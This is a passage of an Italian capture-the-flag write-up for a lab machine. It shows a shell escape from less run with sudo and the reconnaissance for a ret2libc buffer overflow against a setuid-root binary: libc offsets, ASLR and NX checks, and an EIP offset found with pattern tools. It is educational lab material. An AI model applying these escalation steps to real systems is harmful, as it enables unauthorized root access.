Spostiamoci nella home di gilfoyle e vediamo cosa c'è:
#+begin_example
richard@silicon:/home/gilfoyle$ ls -la
total 28
drwxr-xr-x 3 gilfoyle gilfoyle 4096 Jul  6  2021 .
drwxr-xr-x 4 root     root     4096 Jul  6  2021 ..
lrwxrwxrwx 1 gilfoyle gilfoyle    9 Jul  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 gilfoyle gilfoyle  220 Jul  6  2021 .bash_logout
-rw-r--r-- 1 gilfoyle gilfoyle 3771 Jul  6  2021 .bashrc
-rw------- 1 gilfoyle gilfoyle   52 Jul  6  2021 .lesshst
-rw-r--r-- 1 gilfoyle gilfoyle  807 Jul  6  2021 .profile
drwxrwx--- 2 gilfoyle gilfoyle 4096 Jul  6  2021 tools
#+end_example

Aprimao con sudo .lessht:
#+begin_example
.less-history-file:
.search
"bin/sh
.shell
"/bin/sh
#+end_example

Non c'è nulla di interessante.
C'è *tools* che però è una directory e non è leggibile usando less.
Proviamo a vedere quali files o directory sono possedute da gilfoyle
sulla macchina, per vedere se c'è qualche altro file interessante che
possiamo leggere:
#+begin_example
richard@silicon:/home/gilfoyle$ find / -user gilfoyle 2>/dev/null
/home/gilfoyle
/home/gilfoyle/.lesshst
/home/gilfoyle/.profile
/home/gilfoyle/.bash_history
/home/gilfoyle/tools
/home/gilfoyle/.bashrc
/home/gilfoyle/.bash_logout
#+end_example

Ci sono solo i files della home.

Proviamo quindi a lanciare less con sudo e a far spawnare una shell da
dentro less, con il comando
#+begin_example
!/bin/bash
#+end_example

Ha funzionato!
[[./img/gilfoyle_shell.png]]


** gilfoyle
Nella cartella tools della home dell'utente, c'è un file eseguibile a
32bit con i permessi di setuid, il cui proprietario è root.
[[./img/exploitme.png]]

Molto probabilmente bisogna fare buffer overflow per exploitarlo.

Eseguiamo il comando strings, per ottenere qualche informazione:
#+begin_example
gilfoyle@silicon:~/tools$ strings exploitme 
tdT 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
gets
puts
printf
system
setgid
__libc_start_main
GLIBC_2.0
__gmon_start__
[^_]
Enter a string: 
You entered: %s
/bin/sh
Get a shell from this program!
9*2$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7622
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
exploitme.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
__x86.get_pc_thunk.bx
printf@@GLIBC_2.0
gets@@GLIBC_2.0
__x86.get_pc_thunk.bp
_edata
__data_start
setgid@@GLIBC_2.0
puts@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_dl_relocate_static_pie
_fp_hw
__bss_start
main
__x86.get_pc_thunk.ax
setuid@@GLIBC_2.0
__TMC_END__
test
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.gnu.property
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
#+end_example

La stringa più interessante che conferma la teoria del buffer overflow
è *enter a string:* .

Eseguendo più volte il comando 
#+begin_example
ldd exploitme
#+end_example
vediamo che l'ASLR è disabilitato poiché la libreria libc ha sempre lo
stesso indirizzo. Inoltre, troviamo che il path della libreria è
*/lib32/libc.so.6* ed è caricata ad indirizzo *0xf7dd8000*.

[[./img/ldd.png]]

Inoltre, eseguendo il comando
#+begin_example
dmesg | grep NX
#+end_example
vediamo che l'NX a livello kernel è abilitato, quindi non è possibile
eseguire codice nello stack di programma.

Eseguendo
#+begin_example
readelf -s /lib32/libc.so.6 | grep system
#+end_example
si ottiene l'offset della funzione *system()*, pari a *0x00045420*.

Analogamente, per la *exit()* esso è *0x00037f80*.

Per ottenere l'offset della stringa ~/bin/sh~, eseguiamo:
#+begin_example
strings -a -t x /lib32/libc.so.6 | grep bin/sh
#+end_example

Offset: *0x0018f352*

Otteniamo un pattern non ripetibile sulla macchina locale di 256
caratteri col comando 
#+begin_example
msf-pattern_create -l 256
#+end_example
e lo diamo in pasto alll'eseguibile per mandarlo in segmentation
fault.
Il seguente indirizzo lo ha fatto andare in segfault: 37654136

Lo usiamo con msf-pattern_offset per trovare l'offset di EIP:
#+begin_example
msf_pattern-offset -q 37654136
[*] Exact match at offset 140
#+end_example

*EIP offset = 140*


